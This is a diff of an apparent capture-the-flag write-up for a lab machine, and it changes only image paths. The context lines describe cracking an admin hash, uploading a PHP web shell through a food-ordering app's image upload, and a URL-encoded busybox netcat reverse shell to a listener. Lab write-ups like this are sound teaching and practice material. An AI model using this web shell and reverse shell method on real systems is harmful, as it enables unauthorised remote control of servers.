@@ -66,13 +66,13 @@ Nmap done: 1 IP address (1 host up) scanned in 20.61 seconds
 
 Accessing port 80 via a web browser revealed an "Online Food Ordering System V2" application:
 
-![port 80](machines/Luz/image.png)
+![port 80](images/img.png)
 
 The application features a typical food ordering interface with navigation options including Home, Cart, About, Login, and Admin Login.
 
 Navigating to the Admin Login page presented a credential-based authentication form:
 
-![admin login](image-1.png)
+![admin login](images/img-1.png)
 
 ---
 
@@ -227,13 +227,13 @@ Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
 
 After successfully logging in with `hadmin:a[REDACTED]`, the admin dashboard was accessible:
 
-![image](image-2.png)
+![image](images/img-2.png)
 
 The admin panel includes various features such as Home, Orders, Menu, Category List, Users, and **Site Settings**. The Site Settings section contains a file upload functionality that accepts image files.
 
 Inspecting the page source revealed the endpoint where uploaded files are stored:
 
-![alt text](image-3.png)
+![alt text](images/img-3.png)
 
 The source code shows that uploaded images are stored in the `../assets/img/` directory with a timestamp prefix (e.g., `1673244660_food-bg.jpg`).
 
@@ -241,11 +241,11 @@ The source code shows that uploaded images are stored in the `../assets/img/` di
 
 A PHP web shell payload was prepared with the following content:
 
-![payload](image-4.png)
+![payload](images/img-4.png)
 
 The file was named `shell.php` and uploaded through the Site Settings image upload form. After uploading and saving, the source code was inspected to identify the exact filename:
 
-![shell](image-5.png)
+![shell](images/img-5.png)
 
 The uploaded file path was revealed as:
 ```
@@ -254,7 +254,7 @@ The uploaded file path was revealed as:
 
 Accessing the web shell with a test command (`?cmd=id`) confirmed remote code execution:
 
-![alt text](image-6.png)
+![alt text](images/img-6.png)
 
 The response displayed.
 
@@ -277,7 +277,7 @@ busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash
 
 The full URL to trigger the reverse shell:
 
-![revshell](image-7.png)
+![revshell](images/img-7.png)
 
 The reverse shell successfully connected:
 
